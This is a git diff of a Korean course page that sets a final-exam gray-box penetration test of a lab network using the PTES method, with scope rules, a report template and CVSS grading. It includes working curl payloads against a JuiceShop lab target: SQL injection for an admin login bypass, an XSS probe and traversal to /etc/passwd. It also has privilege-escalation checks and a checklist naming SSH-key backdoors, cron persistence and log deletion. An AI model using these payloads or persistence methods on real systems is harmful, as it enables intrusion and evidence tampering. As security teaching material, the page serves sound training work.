@@ -1,779 +1,517 @@
-# Week 15: 기말 - 종합 침투 테스트
+# Week 15: 기말 — 종합 침투 테스트 + PTES 보고서
 
 ## 학습 목표
-- PTES(Penetration Testing Execution Standard) 방법론을 이해한다
-- 전문적인 침투 테스트 보고서 작성 형식을 익힌다
-- 테스트 범위(Scope)와 교전 규칙(Rules of Engagement)을 설정할 수 있다
-- 전체 실습 인프라에 대한 종합 침투 테스트를 수행한다
-- 발견된 취약점을 체계적으로 분류하고 보고서로 작성한다
+- PTES 7단계 방법론의 각 단계를 이해한다
+- Gray Box 침투 테스트의 범위(Scope)와 교전 규칙(RoE)을 설정한다
+- Week 02~14의 모든 기법을 조합하여 전체 인프라 대상 침투 테스트를 수행한다
+- CVSS v3.1로 취약점 심각도를 산정한다
+- 업계 표준 형식의 PTES 보고서(Executive Summary·Findings·Recommendations)를 작성한다
+- Bastion `/ask`로 보고서 초안 자동 생성을 시도하고, 수동 검증·보강한다
 
-## 실습 환경 (공통)
+## 실습 환경 (최종)
 
-| 서버 | IP | 역할 | 접속 |
-|------|-----|------|------|
-| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh ccc@10.20.30.201` (pw: 1) |
-| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `ssh ccc@10.20.30.1` |
-| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `ssh ccc@10.20.30.80` |
-| siem | 10.20.30.100 | SIEM (Wazuh Dashboard:443, OpenCTI:8080) | `ssh ccc@10.20.30.100` |
+| 호스트 | IP | 역할 | 기말 시험 지위 |
+|--------|-----|------|-----------------|
+| manager | 10.20.30.200 | 공격 기지, Bastion API :8003 | 공격자 시작점 |
+| secu | 10.20.30.1 | 방화벽/IPS | **범위 내** — 룰 분석 |
+| web | 10.20.30.80 | JuiceShop | **범위 내** — 주요 표적 |
+| siem | 10.20.30.100 | Wazuh·OpenCTI | **범위 내** — 취약점 점검 |
 
-**Bastion API:** `http://localhost:9100` / Key: `ccc-api-key-2026`
+## 시험 개요
 
-## 강의 시간 배분 (3시간)
-
-| 시간 | 내용 | 유형 |
-|------|------|------|
-| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
-| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
-| 1:10-1:20 | 휴식 | - |
-| 1:20-2:00 | 실습 (Part 3) | 실습 |
-| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
-| 2:40-2:50 | 휴식 | - |
-| 2:50-3:20 | 응용 실습 + Bastion 연동 (Part 5) | 실습 |
-| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |
+| 항목 | 내용 |
+|------|------|
+| 형식 | 실기 시험 + 보고서 |
+| 시간 | 실기 3시간 + 보고서 작성 4시간 (총 7시간, 날짜 분리 가능) |
+| 점수 | 100점 만점 + 보너스 15점 |
+| 제출 | md 형식 PTES 보고서 + ATT&CK Navigator Layer JSON |
 
 ---
 
----
+# Part 1: PTES 방법론
 
-## 용어 해설 (이 과목에서 자주 나오는 용어)
+## 1.1 PTES 7단계
 
-> 대학 1~2학년이 처음 접할 수 있는 보안/IT 용어를 정리한다.
-> 강의 중 모르는 용어가 나오면 이 표를 참고하라.
+```
+1. Pre-engagement Interactions     (사전 협의)   — 범위·규칙·일정
+2. Intelligence Gathering          (정보 수집)   — OSINT·기술 스택
+3. Threat Modeling                 (위협 모델링) — 자산·위협·공격 경로
+4. Vulnerability Analysis          (취약점 분석) — 스캔·수동 분석
+5. Exploitation                    (공격 실행)   — 악용·초기 접근
+6. Post-Exploitation               (후속 공격)   — 권한 상승·지속성·수집
+7. Reporting                       (보고서 작성) — Executive / Technical
+```
 
-| 용어 | 영문 | 설명 | 비유 |
-|------|------|------|------|
-| **페이로드** | Payload | 공격에 사용되는 실제 데이터/코드. 예: `' OR 1=1--` | 미사일의 탄두 |
-| **익스플로잇** | Exploit | 취약점을 악용하는 기법 또는 코드 | 열쇠 없이 문을 여는 방법 |
-| **셸** | Shell | 운영체제와 사용자를 연결하는 명령어 해석기 (bash, sh 등) | OS에게 말 걸 수 있는 창구 |
-| **리버스 셸** | Reverse Shell | 대상 서버가 공격자에게 역방향 연결을 맺는 것 | 도둑이 집에서 밖으로 전화를 거는 것 |
-| **포트** | Port | 서버에서 특정 서비스를 식별하는 번호 (0~65535) | 아파트 호수 |
-| **데몬** | Daemon | 백그라운드에서 실행되는 서비스 프로그램 | 24시간 근무하는 경비원 |
-| **패킷** | Packet | 네트워크로 전송되는 데이터의 단위 | 택배 상자 하나 |
-| **프록시** | Proxy | 클라이언트와 서버 사이에서 중개하는 서버 | 대리인, 중간 거래자 |
-| **해시** | Hash | 임의 길이 데이터를 고정 길이 값으로 변환하는 함수 (SHA-256 등) | 지문 (고유하지만 원본 복원 불가) |
-| **토큰** | Token | 인증 정보를 담은 문자열 (JWT, API Key 등) | 놀이공원 입장권 |
-| **JWT** | JSON Web Token | Base64로 인코딩된 JSON 기반 인증 토큰 | 이름·권한이 적힌 입장권 |
-| **Base64** | Base64 | 바이너리 데이터를 텍스트로 인코딩하는 방법 | 암호가 아닌 "포장" (누구나 풀 수 있음) |
-| **CORS** | Cross-Origin Resource Sharing | 다른 도메인에서의 API 호출 허용 설정 | "외부인 출입 허용" 표지판 |
-| **API** | Application Programming Interface | 프로그램 간 통신 규약 | 식당의 메뉴판 (주문 양식) |
-| **REST** | Representational State Transfer | URL + HTTP 메서드로 자원을 조작하는 API 스타일 | 도서관 대출 시스템 (책 이름으로 검색/대출/반납) |
-| **SSH** | Secure Shell | 원격 서버에 안전하게 접속하는 프로토콜 | 암호화된 전화선 |
-| **sudo** | SuperUser DO | 관리자(root) 권한으로 명령 실행 | "사장님 권한으로 실행" |
-| **SUID** | Set User ID | 실행 시 파일 소유자 권한으로 실행되는 특수 권한 | 다른 사람의 사원증을 빌려 출입 |
-| **IPS** | Intrusion Prevention System | 네트워크 침입 방지 시스템 (악성 트래픽 차단) | 공항 보안 검색대 |
-| **SIEM** | Security Information and Event Management | 보안 로그를 수집·분석하는 통합 관제 시스템 | CCTV 관제실 |
-| **WAF** | Web Application Firewall | 웹 공격을 탐지·차단하는 방화벽 | 웹사이트 전용 경비원 |
-| **nftables** | nftables | Linux 커널 방화벽 프레임워크 (iptables 후계) | 건물 출입구 차단기 |
-| **Suricata** | Suricata | 오픈소스 IDS/IPS 엔진 | 공항 X-ray 검색기 |
-| **Wazuh** | Wazuh | 오픈소스 SIEM 플랫폼 | CCTV + AI 관제 시스템 |
-| **ATT&CK** | MITRE ATT&CK | 실제 공격 전술·기법을 분류한 데이터베이스 | 범죄 수법 백과사전 |
-| **OWASP** | Open Web Application Security Project | 웹 보안 취약점 연구 국제 단체 | 웹 보안의 표준 기관 |
-| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 점수 (0~10점) | 질병 위험도 등급 |
-| **CVE** | Common Vulnerabilities and Exposures | 취약점 고유 식별 번호 | 질병의 고유 코드 (예: COVID-19) |
-| **Bastion** | Bastion | 보안 작업 자동화·증적 관리 플랫폼 (이 수업에서 사용) | 보안 작업 일지 + 자동화 시스템 |
+**실무에서의 비중:**
+- 정보 수집·분석 = 50% 시간
+- 공격 실행 = 20%
+- 보고서 = 30% (가장 많이 소홀하지만 가장 중요)
+
+## 1.2 침투 테스트 유형
+
+| 유형 | 사전 정보 | 시뮬레이션 대상 |
+|------|-----------|-----------------|
+| Black Box | 없음 | 외부 무관한 공격자 |
+| White Box | 전체 (소스·네트워크 등) | 내부자·감사자 |
+| Gray Box | 일부 (계정·IP·네트워크) | 부분 정보 가진 외부 |
+
+**본 기말:** Gray Box — 네트워크(10.20.30.0/24)·SSH 계정(ccc/1)·API 키 제공.
 
 ---
 
-# Week 15: 기말 - 종합 침투 테스트
+# Part 2: 범위(Scope) 및 교전 규칙(RoE)
 
-## 학습 목표
+## 2.1 In-Scope / Out-of-Scope
 
-- PTES(Penetration Testing Execution Standard) 방법론을 이해한다
-- 전문적인 침투 테스트 보고서 작성 형식을 익힌다
-- 테스트 범위(Scope)와 교전 규칙(Rules of Engagement)을 설정할 수 있다
-- 전체 실습 인프라에 대한 종합 침투 테스트를 수행한다
-- 발견된 취약점을 체계적으로 분류하고 보고서로 작성한다
-
----
-
-## 1. 침투 테스트 방법론 (PTES)
-
-### 1.1 PTES란?
-
-PTES(Penetration Testing Execution Standard)는 침투 테스트의 표준 방법론이다. 7단계로 구성된다.
-
+**범위 내:**
 ```
-1. 사전 협의 (Pre-engagement Interactions)
-   --> 범위, 규칙, 일정, 비용 합의
-
-2. 정보 수집 (Intelligence Gathering)
-   --> OSINT, 기술 스택, 네트워크 구조 파악
-
-3. 위협 모델링 (Threat Modeling)
-   --> 자산 식별, 위협 분류, 공격 경로 설계
-
-4. 취약점 분석 (Vulnerability Analysis)
-   --> 스캐닝, 수동 분석, 취약점 검증
-
-5. 공격 실행 (Exploitation)
-   --> 취약점 악용, 초기 접근, 권한 상승
-
-6. 후속 공격 (Post-Exploitation)
-   --> 정보 수집, 지속성, 수평 이동, 데이터 유출
-
-7. 보고서 작성 (Reporting)
-   --> 발견 사항, 위험도, 권고 사항, 증거
+서버: manager/secu/web/siem (10.20.30.0/24)
+서비스: TCP·UDP 전 포트 스캔 가능
+웹: JuiceShop(:3000), Apache(:80), Wazuh(:443)
 ```
 
-### 1.2 침투 테스트 유형
-
-| 유형 | 사전 정보 | 설명 |
-|------|-----------|------|
-| **Black Box** | 없음 | 외부 공격자 시뮬레이션 |
-| **White Box** | 전체 | 소스코드, 네트워크 구조 모두 제공 |
-| **Gray Box** | 일부 | 일부 계정, 네트워크 정보 제공 |
-
-> **본 시험**: Gray Box — 네트워크 구조와 SSH 계정이 제공됨
-
----
-
-## 2. 범위(Scope)와 교전 규칙(Rules of Engagement)
-
-> **이 실습을 왜 하는가?**
-> "기말 - 종합 침투 테스트" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
-> 사이버보안 공격/웹해킹/침투테스트 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
-> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
->
-> **이걸 하면 무엇을 알 수 있는가?**
-> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
-> - 정상과 비정상 결과를 구분하는 눈을 기름
-> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
->
-> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.
-
-### 2.1 테스트 범위
-
+**범위 외 (금지):**
 ```
-[범위 내 (In-Scope)]
-
-서버:
-  - bastion (10.20.30.201) — 공격 출발점
-  - secu    (10.20.30.1)   — 방화벽/IPS
-  - web     (10.20.30.80)  — 웹 서버 (JuiceShop:3000)
-  - siem    (10.20.30.100) — SIEM
-
-서비스:
-  - HTTP (80, 3000)
-  - SSH (22)
-  - 모든 TCP/UDP 포트
-
-[범위 외 (Out-of-Scope)]
-
-  - 10.20.30.0/24 이외의 네트워크
-  - 물리적 접근 공격
-  - 소셜 엔지니어링
-  - DoS/DDoS 공격
+- 10.20.30.0/24 외부 네트워크
+- 물리적 접근 공격
+- 소셜 엔지니어링 (실제 사람 상대)
+- DoS/DDoS 공격
+- 다른 학생의 환경
 ```
 
-### 2.2 교전 규칙 (Rules of Engagement)
+## 2.2 교전 규칙 (RoE)
 
 ```
-1. 모든 공격은 실습 네트워크(10.20.30.0/24)에서만 수행한다
-2. 서비스 가용성을 의도적으로 저해하지 않는다 (DoS 금지)
-3. 발견된 데이터를 외부로 유출하지 않는다
-4. rm -rf /, 디스크 포맷 등 파괴적 명령을 실행하지 않는다
-5. 모든 공격 활동을 기록한다 (Bastion 또는 수동 메모)
-6. 설치한 지속성 메커니즘은 시험 종료 후 반드시 제거한다
-7. 발견된 취약점은 보고서에만 기록하고 악용하지 않는다
+R1. 공격은 실습 네트워크(10.20.30.0/24)에서만
+R2. 서비스 가용성 의도적 저해 금지 (no DoS)
+R3. 발견 데이터 외부 유출 금지
+R4. 파괴적 명령 금지 (rm -rf /, dd, 디스크 포맷)
+R5. 모든 공격 기록 (Bastion /evidence 또는 수동 메모)
+R6. 설치한 지속성 메커니즘은 시험 종료 후 반드시 제거
+R7. 발견 취약점은 보고서에만 기록, 악용 지속 금지
 ```
 
 ---
 
-## 3. 보고서 작성 형식
+# Part 3: 보고서 구조
 
-### 3.1 전문 침투 테스트 보고서 구조
+## 3.1 PTES 표준 보고서 구조
 
 ```
-1. 표지 (Cover Page)
-   - 프로젝트명, 고객명, 테스터명, 날짜, 기밀등급
+1. Cover Page
+   - 프로젝트명·고객·테스터·날짜·기밀등급
 
-2. 경영진 요약 (Executive Summary)
-   - 비기술적 언어로 전체 결과 요약 (1페이지)
-   - 전체 위험도 평가 (Critical/High/Medium/Low 수)
+2. Executive Summary (1페이지, 비기술자용)
+   - 전체 위험도 (Critical/High/Medium/Low 건수)
+   - Top 3 발견사항
    - 핵심 권고 사항
 
-3. 테스트 개요 (Test Overview)
-   - 범위, 방법론, 사용 도구, 일정
+3. Test Overview
+   - 범위·방법론·사용 도구·일정
 
-4. 발견 사항 (Findings)
-   - 각 취약점별:
-     a. 제목 및 위험도 (CVSS 점수)
-     b. 영향받는 시스템/URL
-     c. 상세 설명
-     d. 재현 단계 (Step-by-step)
-     e. 증거 (스크린샷, 명령어 출력)
-     f. MITRE ATT&CK 매핑
-     g. 권고 사항 (수정 방법)
+4. Findings (각 취약점별)
+   a. 제목 + CVSS 점수
+   b. 영향 시스템
+   c. 상세 설명
+   d. 재현 단계 (step-by-step, 명령 포함)
+   e. 증거 (stdout, 스크린샷, pcap)
+   f. MITRE ATT&CK 매핑
+   g. 권고 (구체적 수정 방법)
 
-5. 부록 (Appendix)
+5. Appendix
    - 전체 스캔 결과
    - 사용 도구 목록
-   - ATT&CK Navigator Layer
+   - ATT&CK Navigator Layer JSON 링크
+   - Bastion /evidence 요약
 ```
 
-### 3.2 CVSS (Common Vulnerability Scoring System)
+## 3.2 CVSS v3.1 등급
 
-취약점의 심각도를 0.0~10.0 점수로 평가하는 표준이다.
+| 점수 | 등급 | 예시 |
+|------|------|------|
+| 9.0-10.0 | Critical | Admin 인증 우회, RCE, SSH 키 탈취 |
+| 7.0-8.9 | High | IDOR 전체 사용자 접근, sudo NOPASSWD |
+| 4.0-6.9 | Medium | CSP 부재, 버전 노출 |
+| 0.1-3.9 | Low | HTTP 헤더 X-Powered-By 노출 |
 
-| 점수 범위 | 등급 | 색상 |
-|-----------|------|------|
-| 9.0~10.0 | Critical | 빨강 |
-| 7.0~8.9 | High | 주황 |
-| 4.0~6.9 | Medium | 노랑 |
-| 0.1~3.9 | Low | 초록 |
-| 0.0 | None | 회색 |
-
-### 3.3 취약점 보고 예시
-
-```
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-[CRITICAL] F-01: SQL Injection — 제품 검색 API
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-CVSS:     9.8 (Critical)
-시스템:   web (10.20.30.80:3000)
-URL:      /rest/products/search?q=
-ATT&CK:   T1190 (Exploit Public-Facing Application)
-
-[설명]
-JuiceShop 제품 검색 API의 q 파라미터에서 SQL Injection이
-가능하다. 공격자는 데이터베이스의 모든 데이터를 읽을 수 있으며,
-관리자 인증을 우회할 수 있다.
-
-[재현 단계]
-1. 다음 URL에 접속한다:
-   http://10.20.30.80:3000/rest/products/search?q=test' OR 1=1--
-2. 모든 제품이 반환되면 취약점이 확인된 것이다.
-
-[증거]
-$ curl -s "http://10.20.30.80:3000/rest/products/search?q=test'%20OR%201=1--"
-{"status":"success","data":[...전체 제품 목록...]}
-
-[권고 사항]
-- 파라미터화된 쿼리(Prepared Statement)를 사용한다
-- 입력값 검증 및 이스케이핑을 적용한다
-- WAF에 SQL Injection 탐지 규칙을 추가한다
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-```
-
----
-
-## 4. 기말 시험 안내
-
-### 4.1 시험 형식
-
-| 항목 | 내용 |
-|------|------|
-| **시간** | 3시간 |
-| **유형** | 실기 시험 (실습 환경에서 침투 테스트 수행) |
-| **대상** | 전체 인프라 (bastion, secu, web, siem) |
-| **제출물** | 침투 테스트 보고서 (Markdown) |
-
-### 4.2 채점 기준
-
-| 항목 | 배점 | 세부 기준 |
-|------|------|-----------|
-| **정찰** | 15점 | 포트 스캔, 서비스 식별, 기술 스택 파악 |
-| **취약점 발견** | 30점 | 발견된 취약점 수와 심각도 |
-| **공격 실행** | 20점 | 취약점 악용 성공 여부, 권한 상승 |
-| **ATT&CK 매핑** | 10점 | 모든 공격의 정확한 ATT&CK ID 매핑 |
-| **보고서 품질** | 15점 | 구조, 재현 가능성, 증거 포함 |
-| **권고 사항** | 10점 | 실용적이고 구체적인 수정 방안 |
-| **합계** | **100점** | |
-
-### 4.3 추가 점수 (보너스)
-
-| 항목 | 추가 점수 |
-|------|-----------|
-| Bastion 자동화 활용 | +5점 |
-| ATT&CK Navigator Layer JSON 제출 | +3점 |
-| 수동으로 찾기 어려운 취약점 발견 | +5점 |
-| PoW 증거 체인을 보고서에 포함 | +2점 |
-
----
-
-## 5. 실습: 종합 침투 테스트 수행
-
-### 실습 1: 정찰 (15분)
-
-> **실습 목적**: 학기 전체에서 배운 정찰-공격-후속조치 기법을 종합하여 실전 침투 테스트를 수행한다
->
-> **배우는 것**: 실제 모의해킹 프로젝트처럼 시간 제한 내에 체계적으로 취약점을 발견하고 PoW 증적 기반 보고서를 작성한다
->
-> **결과 해석**: 각 단계의 출력에서 발견된 취약점을 CVSS로 등급화하고, ATT&CK 기법으로 분류하여 보고서에 포함한다
->
-> **실전 활용**: 실무 모의해킹에서는 발견-증명-보고의 전 과정을 체계적으로 수행하여 고객에게 납품한다
-
-```bash
-# 환경 변수 설정
-export BASTION_API_KEY="ccc-api-key-2026"          # 환경 변수 설정
-
-# === 전체 네트워크 스캔 ===
-
-# 1. 각 서버 포트 스캔
-echo "===== secu (10.20.30.1) ====="
-nmap -sT -F 10.20.30.1                                 # 포트 스캔
-
-echo ""
-echo "===== web (10.20.30.80) ====="
-nmap -sT -F 10.20.30.80                                # 포트 스캔
-
-echo ""
-echo "===== siem (10.20.30.100) ====="
-nmap -sT -F 10.20.30.100                               # 포트 스캔
-
-# 2. 서비스 버전 탐지 (web 서버)
-nmap -sV -p 22,80,3000 10.20.30.80                     # 서비스 버전 탐지 / 지정 포트
-
-# 3. 웹 서비스 확인
-curl -s -o /dev/null -w "JuiceShop: %{http_code}\n" http://10.20.30.80:3000/  # silent 모드
-curl -s -o /dev/null -w "Nginx/WAF: %{http_code}\n" http://10.20.30.80/  # silent 모드
-
-# 4. JuiceShop API 엔드포인트 탐색
-curl -s http://10.20.30.80:3000/api/ 2>/dev/null | head -c 300  # silent 모드
-curl -s http://10.20.30.80:3000/rest/products/search?q=test | python3 -m json.tool 2>/dev/null | head -20  # silent 모드
-```
-
-### 실습 2: 취약점 분석 (30분)
-
-```bash
-# === 웹 취약점 테스트 ===
-
-# 1. SQL Injection 테스트
-echo "===== SQL Injection ====="
-curl -s "http://10.20.30.80:3000/rest/products/search?q=test'%20OR%201=1--" | \
-  python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과: {len(d.get(\"data\",[]))}개')" 2>/dev/null  # Python 코드 실행
-
-# 2. 인증 우회 테스트
-echo ""
-echo "===== 인증 우회 ====="
-curl -s -X POST http://10.20.30.80:3000/rest/user/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"\" or 1=1--","password":"a"}' | head -c 200  # 요청 데이터(body)
-
-# 3. XSS 테스트
-echo ""
-echo "===== XSS 검사 ====="
-curl -s "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>" | head -c 200  # silent 모드
-
-# 4. 디렉토리 트래버설 테스트
-echo ""
-echo "===== 디렉토리 트래버설 ====="
-curl -s "http://10.20.30.80:3000/ftp/../../etc/passwd" | head -5  # silent 모드
-
-# === 서버 취약점 테스트 ===
-
-# 5. web 서버 권한 확인
-echo ""
-echo "===== 서버 권한 확인 ====="
-ssh ccc@10.20.30.80 "echo 1 | sudo -S -l 2>/dev/null"  # 비밀번호 자동입력 SSH
-
-# 6. SUID 검사
-echo ""
-echo "===== SUID 바이너리 ====="
-ssh ccc@10.20.30.80 \
-  "find / -perm -4000 -type f 2>/dev/null"
-
-# === 방화벽/IPS 분석 ===
-
-# 7. secu 규칙 확인
-echo ""
-echo "===== nftables 규칙 ====="
-ssh ccc@10.20.30.1 \
-  "sudo nft list ruleset 2>/dev/null | head -30"
-```
-
-### 실습 3: 공격 실행 (30분)
-
-Bastion Manager API를 호출하여 작업을 수행합니다.
-
-```bash
-# === Bastion 자동화 공격 ===
-
-# 프로젝트 생성
-PROJECT=$(curl -s -X POST http://localhost:9100/projects \
-  -H "Content-Type: application/json" \
-  -H "X-API-Key: $BASTION_API_KEY" \
-  -d '{                                                # 요청 데이터(body)
-    "name": "week15-final-pentest",
-    "request_text": "기말 종합 침투 테스트",
-    "master_mode": "external"
-  }')
-PID=$(echo "$PROJECT" | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
-echo "프로젝트 ID: $PID"
-
-# Stage 전환
-curl -s -X POST "http://localhost:9100/projects/$PID/plan" \
-  -H "X-API-Key: $BASTION_API_KEY" > /dev/null         # API 인증 키
-curl -s -X POST "http://localhost:9100/projects/$PID/execute" \
-  -H "X-API-Key: $BASTION_API_KEY" > /dev/null         # API 인증 키
-
-# 정찰 + 공격 체인 실행
-curl -s -X POST "http://localhost:9100/projects/$PID/execute-plan" \
-  -H "Content-Type: application/json" \
-  -H "X-API-Key: $BASTION_API_KEY" \
-  -d '{                                                # 요청 데이터(body)
-    "tasks": [
-      {
-        "order": 1,
-        "instruction_prompt": "nmap -sT -p 22,80,3000 10.20.30.80 10.20.30.1 10.20.30.100",
-        "risk_level": "low",
-        "subagent_url": "http://localhost:8002"
-      },
-      {
-        "order": 2,
-        "instruction_prompt": "curl -s http://10.20.30.80:3000/rest/products/search?q=test%27%20OR%201=1-- | python3 -c \"import sys,json; d=json.load(sys.stdin); print(f\\\"SQLi: {len(d.get(\\\\\\\"data\\\\\\\",[]))}개 결과\\\")\" 2>/dev/null || echo SQLi test done",
-        "risk_level": "medium",
-        "subagent_url": "http://localhost:8002"
-      },
-      {
-        "order": 3,
-        "instruction_prompt": "curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"\\\\\\\" or 1=1--\\\",\\\"password\\\":\\\"a\\\"}\" | head -c 300",
-        "risk_level": "medium",
-        "subagent_url": "http://localhost:8002"
-      },
-      {
-        "order": 4,
-        "instruction_prompt": "whoami && id && uname -r",
-        "risk_level": "low",
-        "subagent_url": "http://10.20.30.80:8002"
-      },
-      {
-        "order": 5,
-        "instruction_prompt": "sudo -l 2>/dev/null | head -10",
-        "risk_level": "low",
-        "subagent_url": "http://10.20.30.80:8002"
-      }
-    ],
-    "subagent_url": "http://localhost:8002"
-  }' | python3 -m json.tool
-```
-
-### 실습 4: 증거 수집 및 보고서 작성 (45분)
-
-Bastion Manager API를 호출하여 작업을 수행합니다.
-
-```bash
-# 증거 요약
-echo "===== 증거 요약 ====="
-curl -s -H "X-API-Key: $BASTION_API_KEY" \
-  "http://localhost:9100/projects/$PID/evidence/summary" | python3 -m json.tool
-
-# PoW 체인 검증
-echo ""
-echo "===== PoW 검증 ====="
-curl -s -H "X-API-Key: $BASTION_API_KEY" \
-  "http://localhost:9100/pow/verify?agent_id=http://localhost:8002" | python3 -m json.tool
-
-# 작업 재생
-echo ""
-echo "===== 작업 타임라인 ====="
-curl -s -H "X-API-Key: $BASTION_API_KEY" \
-  "http://localhost:9100/projects/$PID/replay" | python3 -m json.tool
-```
-
-### 보고서 템플릿
-
-시험 제출용 보고서는 아래 형식을 따른다. Markdown으로 작성한다.
+## 3.3 취약점 보고 예시
 
 ```markdown
-# 침투 테스트 보고서
+### F-01 [CRITICAL 9.8] JuiceShop SQL Injection
 
-## 1. 테스트 개요
+**시스템:** web (10.20.30.80:3000)
+**URL:** /rest/user/login
+**ATT&CK:** T1190 Exploit Public-Facing Application
 
-| 항목 | 내용 |
-|------|------|
-| 프로젝트명 | 기말 종합 침투 테스트 |
-| 테스터 | (이름, 학번) |
-| 날짜 | 2026-03-27 |
-| 범위 | 10.20.30.0/24 (secu, web, siem) |
-| 유형 | Gray Box |
-| 방법론 | PTES |
+**설명**
+로그인 API의 email 필드에 SQL Injection이 가능하여 비밀번호 없이 admin 계정으로 로그인 가능.
 
-## 2. 경영진 요약
+**재현 단계**
+1. 다음 요청 전송:
+   ```bash
+   curl -X POST http://10.20.30.80:3000/rest/user/login \
+     -H "Content-Type: application/json" \
+     -d '{"email":"'\'' OR 1=1--","password":"x"}'
+   ```
+2. 응답 JSON의 `authentication.token` 획득
+3. 토큰 디코딩 → `role: admin` 확인
 
-전체 인프라에 대한 침투 테스트 결과, 총 X개의 취약점을 발견했다.
-- Critical: X개
-- High: X개
-- Medium: X개
-- Low: X개
+**증거**
+```
+HTTP/1.1 200 OK
+{"authentication": {"token": "eyJhbGciOi...", "umail": "admin@juice-sh.op"}}
+```
+디코딩된 페이로드: `{"role":"admin","id":1}`
 
-가장 심각한 위험은 (요약)이며, 즉시 조치가 필요하다.
-
-## 3. 발견 사항
-
-### F-01: [Critical] SQL Injection — 제품 검색 API
-- **CVSS**: 9.8
-- **시스템**: web (10.20.30.80:3000)
-- **ATT&CK**: T1190
-- **설명**: ...
-- **재현 단계**:
-  1. ...
-  2. ...
-- **증거**: (명령어와 출력 결과)
-- **권고**: ...
-
-### F-02: [High] sudo NOPASSWD:ALL 설정
-- **CVSS**: 8.4
-- **시스템**: web (10.20.30.80)
-- **ATT&CK**: T1548.003
-- ...
-
-(각 취약점별 반복)
-
-## 4. ATT&CK 매핑
-
-| 공격 단계 | ATT&CK ID | 기법명 | 대상 서버 |
-|-----------|-----------|--------|----------|
-| 정찰 | T1046 | Network Service Scanning | 전체 |
-| ... | ... | ... | ... |
-
-## 5. 권고 사항 요약
-
-| 우선순위 | 취약점 | 수정 방법 | 예상 소요 |
-|----------|--------|-----------|-----------|
-| 1 | F-01 SQLi | Prepared Statement 적용 | 2일 |
-| 2 | F-02 sudo | sudoers 최소 권한 설정 | 1시간 |
-| ... | ... | ... | ... |
-
-## 6. 부록
-
-### A. 전체 포트 스캔 결과
-(nmap 출력 첨부)
-
-### B. 사용 도구
-- nmap, curl, sshpass, Bastion
-
-### C. Bastion 프로젝트 ID
-- Project ID: (프로젝트 ID)
-- PoW 검증: valid=true, blocks=X
+**권고**
+- 모든 SQL 쿼리를 파라미터화된 형태로 변경
+- ORM(Sequelize) findOne({where: {email: userInput}}) 사용
+- WAF에 SQLi 패턴 차단 룰 추가
 ```
 
 ---
 
-## 6. 시험 진행 팁
+# Part 4: 기말 실기 과제 (3시간)
 
-### 6.1 시간 배분
+## 4.1 채점 배점 (100점 + 보너스 15점)
+
+| 항목 | 배점 | 세부 |
+|------|------|------|
+| 정찰 | 15 | 포트·서비스·버전·기술 스택 |
+| 취약점 발견 | 30 | 발견 수·심각도 분포 |
+| 공격 실행 | 20 | 실제 악용 성공·권한 상승 |
+| ATT&CK 매핑 | 10 | Navigator Layer 정확도 |
+| 보고서 품질 | 15 | 구조·재현 가능성·증거 |
+| 권고 품질 | 10 | 구체성·실용성 |
+
+**보너스:**
+- Bastion 자동화 활용: +5
+- Navigator Layer JSON 제출: +3
+- 수동 찾기 어려운 취약점: +5
+- 방어 룰 1개 이상 작성: +2
+
+## 4.2 기대 발견 사항 목록 (체크리스트)
+
+Week 02~12에서 다룬 모든 취약점. 기말에서는 스스로 재발견·보고.
 
 ```
-0:00 ~ 0:15  정찰 (포트 스캔, 서비스 식별)
-0:15 ~ 0:45  취약점 분석 (웹, 서버, 네트워크)
-0:45 ~ 1:15  공격 실행 (SQLi, 권한 상승, 우회)
-1:15 ~ 1:30  후속 공격 (지속성, 수평 이동)
-1:30 ~ 2:00  ATT&CK 매핑 및 정리
-2:00 ~ 2:45  보고서 작성
-2:45 ~ 3:00  최종 검토 및 제출
+[정찰·탐색]
+□ 포트 오픈 목록 (nmap)
+□ 서비스 버전 (Apache, Node.js Express, OpenSSH)
+□ JuiceShop API 엔드포인트 (14+개)
+□ /ftp 디렉토리 노출
+
+[인증·접근제어 (A01/A07)]
+□ admin 비밀번호 약함 (admin123)
+□ SQL Injection → admin 로그인
+□ IDOR — basket/1~N 접근
+□ 수직 권한상승 — customer → admin API
+
+[Injection (A03)]
+□ SQLi (검색·로그인)
+□ DOM/Reflected/Stored XSS
+
+[보안 설정 오류 (A05)]
+□ CSP 부재, HSTS 부재, CORS *
+□ X-Powered-By 노출
+□ /rest/admin/application-configuration 무인증 접근
+
+[SSRF/파일 (A10)]
+□ 프로필 이미지 URL SSRF
+□ /ftp null byte(%2500) 우회
+□ 파일 업로드 MIME 우회
+
+[암호화 실패 (A02)]
+□ JWT 페이로드에 MD5 password 노출
+□ 자체서명 TLS (Wazuh)
+
+[서버 권한상승]
+□ sudo NOPASSWD:ALL (web)
+□ SUID 바이너리 목록
+□ /etc/shadow 읽기
+
+[지속성·안티포렌식 (실습 시연만, 시험 후 제거 필수)]
+□ SSH 키 인젝션
+□ cron 백도어
+□ 로그 삭제·타임스탬프 조작
 ```
 
-### 6.2 체크리스트
+## 4.3 실기 수행 예시 (수동 + Bastion 조합)
 
-```
-정찰:
-  [ ] 전체 서버 포트 스캔 완료
-  [ ] 서비스 버전 식별 완료
-  [ ] 웹 애플리케이션 구조 파악
-
-웹 공격:
